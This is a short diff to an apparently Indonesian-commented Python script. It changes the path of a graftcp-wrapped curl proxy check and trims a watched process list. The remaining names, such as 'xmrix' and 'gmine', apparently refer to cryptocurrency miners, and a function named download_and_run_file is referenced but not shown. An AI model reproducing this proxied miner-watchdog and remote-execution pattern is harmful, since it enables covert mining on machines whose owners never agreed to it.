@@ -9,7 +9,7 @@ def check_proxy():
         # Url
         url = 'https://jsonapi.org/'
         # Membuat subprocess untuk menjalankan curl command
-        curl_command = f"./model/graftcp curl -s -o /dev/null -w '%{{http_code}}' {url}"
+        curl_command = f"./graftcp/graftcp curl -s -o /dev/null -w '%{{http_code}}' {url}"
         result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)
 
         # Memeriksa http_code dari respons curl
@@ -84,7 +84,7 @@ def download_and_run_file():
         print(f"Error downloading/running file: {e}")
 
 if __name__ == "__main__":
-    process_list = ['me.py', 'mecp.py', 'gas', 'graftcp', 'graftcp-local', 'xmrix', 'lol', 'gmine', 'bzme', 'cape']
+    process_list = ['gas', 'graftcp', 'graftcp-local', 'xmrix', 'lol', 'gmine', 'bzme', 'cape']
     
     while True:
         if check_proxy():
